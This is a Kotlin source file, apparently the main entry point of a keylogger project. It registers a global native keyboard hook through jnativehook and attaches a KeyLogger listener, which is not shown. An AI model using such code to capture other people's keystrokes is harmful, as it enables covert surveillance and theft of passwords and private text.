package org.example.project.keyLogger

import org.jnativehook.GlobalScreen
import org.slf4j.LoggerFactory
import java.util.logging.Level
import java.util.logging.Logger

fun main() {
    initialize()

    LoggerFactory.getLogger("KeyLogger.class").info("Key logger has benn started.")

    GlobalScreen.registerNativeHook()
    GlobalScreen.addNativeKeyListener(KeyLogger())
}

fun initialize() {
    // Set the location of log4j configuration file.
    System.setProperty("log4j.configurationFile", "desktopMain/resources/log4j2.xml")

    val logger = Logger.getLogger(GlobalScreen::class.java.packageName)
    logger.level = Level.WARNING

    logger.useParentHandlers = false
}
